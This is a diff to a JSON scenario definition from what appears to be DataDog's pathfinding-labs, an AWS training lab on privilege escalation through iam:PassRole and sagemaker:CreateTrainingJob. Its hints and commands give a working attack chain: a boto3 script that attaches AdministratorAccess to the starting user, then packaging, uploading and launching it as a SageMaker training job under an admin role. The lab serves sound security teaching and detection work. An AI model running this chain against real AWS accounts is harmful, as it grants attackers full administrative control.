@@ -1,5 +1,5 @@
 {
-  "displayName": "Privilege Escalation via iam:PassRole + sagemaker:CreateTrainingJob",
+  "displayName": "SageMaker Training Job Creation to Admin",
   "name": "sagemaker-002-iam-passrole+sagemaker-createtrainingjob",
   "description": "Creating SageMaker training job with malicious script and admin role to execute code with elevated privileges",
   "costEstimate": "$0/mo",
@@ -31,26 +31,30 @@
     "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/sagemaker-002-iam-passrole+sagemaker-createtrainingjob"
   },
   "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/sagemaker-002-iam-passrole+sagemaker-createtrainingjob",
-  "schemaVersion": "3.0.0",
+  "schemaVersion": "4.0.0",
   "permissions": {
     "required": [
       {
         "permission": "iam:PassRole",
+        "principal": "pl-prod-sagemaker-002-to-admin-starting-user",
         "resource": "arn:aws:iam::*:role/pl-prod-sagemaker-002-to-admin-passable-role",
         "description": "allows passing the admin execution role to the SageMaker training job"
       },
       {
         "permission": "sagemaker:CreateTrainingJob",
+        "principal": "pl-prod-sagemaker-002-to-admin-starting-user",
         "resource": "*",
         "description": "allows creating the training job that executes the malicious script"
       },
       {
         "permission": "s3:PutObject",
+        "principal": "pl-prod-sagemaker-002-to-admin-starting-user",
         "resource": "arn:aws:s3:::pl-prod-sagemaker-002-to-admin-bucket-*/*",
         "description": "allows uploading the malicious training script to the bucket"
       },
       {
         "permission": "s3:GetObject",
+        "principal": "pl-prod-sagemaker-002-to-admin-starting-user",
         "resource": "arn:aws:s3:::pl-prod-sagemaker-002-to-admin-bucket-*/*",
         "description": "allows reading objects from the training bucket"
       }
@@ -58,18 +62,22 @@
     "helpful": [
       {
         "permission": "iam:ListRoles",
+        "principal": "pl-prod-sagemaker-002-to-admin-starting-user",
         "purpose": "discover available privileged roles to pass"
       },
       {
         "permission": "iam:GetRole",
+        "principal": "pl-prod-sagemaker-002-to-admin-starting-user",
         "purpose": "verify the role has administrative permissions before passing it"
       },
       {
         "permission": "sagemaker:DescribeTrainingJob",
+        "principal": "pl-prod-sagemaker-002-to-admin-starting-user",
         "purpose": "monitor training job status and execution progress"
       },
       {
         "permission": "s3:ListBucket",
+        "principal": "pl-prod-sagemaker-002-to-admin-starting-user",
         "purpose": "verify S3 bucket access and list contents"
       }
     ]
@@ -153,18 +161,25 @@
         "label": "s3:PutObject",
         "description": "Upload a malicious Python training script to the S3 bucket. The script will use the training job's execution role credentials to grant admin access to the starting user.\n",
         "hints": [
-          "You can pass a privileged role to a compute service and have it execute arbitrary code.",
-          "Upload a script that performs IAM actions using the training job's execution role credentials.",
-          "The training job will download and execute whatever script is stored here."
+          "Start by understanding what resources exist in this scenario. Use iam:ListRoles to discover roles whose names suggest they belong to this scenario.",
+          "Use iam:GetRole on any interesting roles to inspect their trust policy \u2014 look for roles that trust a specific AWS service principal.",
+          "Use s3:ListBucket to discover the S3 bucket available in this scenario and understand what you have write access to.",
+          "SageMaker training jobs download and execute whatever script is placed in the S3 source directory. Think about what you could make that script do.",
+          "The training script runs with the credentials of the execution role passed to the job. Write a Python script that uses boto3 to call IAM actions on your behalf.",
+          "SageMaker expects training code packaged as a tar.gz archive with the entry point specified via hyperparameters. Package your script before uploading."
         ],
         "commands": [
           {
             "description": "Create a malicious training script that attaches admin policy to the starting user",
-            "command": "cat > /tmp/train.py << 'EOF'\nimport boto3, os\niam = boto3.client('iam')\niam.attach_user_policy(\n    UserName='pl-prod-sagemaker-002-to-admin-starting-user',\n    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n)\nEOF\n"
+            "command": "cat > /tmp/exploit.py << 'EOF'\nimport boto3\niam = boto3.client('iam')\niam.attach_user_policy(\n    UserName='pl-prod-sagemaker-002-to-admin-starting-user',\n    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n)\nEOF\n"
           },
           {
-            "description": "Upload the malicious script to the training bucket",
-            "command": "aws s3 cp /tmp/train.py s3://pl-prod-sagemaker-002-to-admin-bucket-{account_id}-{suffix}/train.py"
+            "description": "Package the script as a tar.gz archive for SageMaker",
+            "command": "cd /tmp && tar -czf sourcedir.tar.gz exploit.py && cd -"
+          },
+          {
+            "description": "Upload the packaged script to the training bucket",
+            "command": "aws s3 cp /tmp/sourcedir.tar.gz s3://pl-prod-sagemaker-002-to-admin-bucket-{account_id}-{suffix}/sourcedir.tar.gz"
           }
         ]
       },
@@ -174,14 +189,17 @@
         "label": "iam:PassRole + sagemaker:CreateTrainingJob",
         "description": "Create a SageMaker training job that passes the admin role and references the malicious script in S3. SageMaker downloads the script and executes it with the admin role's credentials.\n",
         "hints": [
-          "Look for roles that trust SageMaker and carry administrative permissions.",
-          "Check what IAM role is attached to the training job.",
+          "You have iam:PassRole on the passable admin role and sagemaker:CreateTrainingJob. These two permissions together let you designate what code runs and with what identity.",
+          "Use iam:GetRole to confirm the passable role has admin permissions and its trust policy allows sagemaker.amazonaws.com as the principal.",
+          "When creating the training job, specify the packaged script location via the sagemaker_submit_directory hyperparameter and the entry point via sagemaker_program.",
+          "You will need to specify a SageMaker-compatible container image (a PyTorch or TensorFlow deep learning container from the regional ECR account). Use the pytorch-training image from account 763104351884 in your region.",
+          "Use sagemaker:DescribeTrainingJob to poll job status. The training container takes 3-5 minutes to provision before your script executes.",
           "Browse to https://pathfinding.cloud/paths/sagemaker-002 for technique details."
         ],
         "commands": [
           {
             "description": "Create the SageMaker training job with the admin passable role",
-            "command": "aws sagemaker create-training-job \\\n  --training-job-name pl-prod-sagemaker-002-to-admin-training-job \\\n  --role-arn arn:aws:iam::{account_id}:role/pl-prod-sagemaker-002-to-admin-passable-role \\\n  --algorithm-specification TrainingInputMode=File,TrainingImage=763104351884.dkr.ecr.us-east-1.amazonaws.com/pytorch-training:1.9.0-cpu-py38 \\\n  --output-data-config S3OutputPath=s3://pl-prod-sagemaker-002-to-admin-bucket-{account_id}-{suffix}/output \\\n  --resource-config InstanceType=ml.m4.xlarge,InstanceCount=1,VolumeSizeInGB=5 \\\n  --stopping-condition MaxRuntimeInSeconds=300 \\\n  --hyper-parameters script=s3://pl-prod-sagemaker-002-to-admin-bucket-{account_id}-{suffix}/train.py\n"
+            "command": "aws sagemaker create-training-job \\\n  --training-job-name pl-demo-training-$(date +%s) \\\n  --role-arn arn:aws:iam::{account_id}:role/pl-prod-sagemaker-002-to-admin-passable-role \\\n  --algorithm-specification '{\"TrainingImage\": \"763104351884.dkr.ecr.{region}.amazonaws.com/pytorch-training:2.0.0-cpu-py310\", \"TrainingInputMode\": \"File\"}' \\\n  --input-data-config '[{\"ChannelName\": \"training\", \"DataSource\": {\"S3DataSource\": {\"S3DataType\": \"S3Prefix\", \"S3Uri\": \"s3://pl-prod-sagemaker-002-to-admin-bucket-{account_id}-{suffix}\", \"S3DataDistributionType\": \"FullyReplicated\"}}}]' \\\n  --output-data-config '{\"S3OutputPath\": \"s3://pl-prod-sagemaker-002-to-admin-bucket-{account_id}-{suffix}/output\"}' \\\n  --resource-config '{\"InstanceType\": \"ml.m5.large\", \"InstanceCount\": 1, \"VolumeSizeInGB\": 10}' \\\n  --stopping-condition '{\"MaxRuntimeInSeconds\": 600}' \\\n  --hyper-parameters '{\"sagemaker_program\": \"exploit.py\", \"sagemaker_submit_directory\": \"s3://pl-prod-sagemaker-002-to-admin-bucket-{account_id}-{suffix}/sourcedir.tar.gz\"}'\n"
           }
         ]
       },
@@ -191,16 +209,22 @@
         "label": "Executes as admin role",
         "description": "The training job runs the malicious script with the admin role's temporary credentials, attaching AdministratorAccess to the starting user and completing the privilege escalation.\n",
         "hints": [
-          "The training job executes with full admin credentials available as environment variables."
+          "Poll the training job status with sagemaker:DescribeTrainingJob until it reaches Completed. This typically takes 3-5 minutes.",
+          "Once the job completes, wait 15 seconds for IAM policy propagation before verifying the escalation worked.",
+          "Verify success by listing the policies attached to your starting user with iam:ListAttachedUserPolicies, then confirm admin access by calling iam:ListUsers."
         ],
         "commands": [
           {
             "description": "Wait for training job to complete",
-            "command": "aws sagemaker describe-training-job --training-job-name pl-prod-sagemaker-002-to-admin-training-job --query 'TrainingJobStatus'"
+            "command": "aws sagemaker describe-training-job --training-job-name <job-name> --query 'TrainingJobStatus' --output text"
           },
           {
-            "description": "Verify admin access was granted",
+            "description": "Verify admin access was granted to the starting user",
             "command": "aws iam list-attached-user-policies --user-name pl-prod-sagemaker-002-to-admin-starting-user"
+          },
+          {
+            "description": "Confirm administrator access with a privileged API call",
+            "command": "aws iam list-users --max-items 3 --output table"
           }
         ]
       }
